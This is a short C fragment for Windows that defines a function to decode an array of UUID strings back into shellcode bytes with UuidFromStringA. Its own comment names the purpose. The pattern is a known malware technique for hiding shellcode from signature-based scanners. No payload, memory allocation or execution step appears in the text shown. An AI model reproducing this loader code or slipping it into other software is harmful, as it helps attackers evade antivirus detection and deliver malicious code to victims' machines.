
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

// Deobfuscate UUID strings back to shellcode bytes
void deobfuscate_uuid(const char* uuids[], int uuid_count, unsigned char* shellcode_buf) {
    for (int i = 0; i < uuid_count; i++) {
        UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)&shellcode_buf[i * 16]);
    }
}
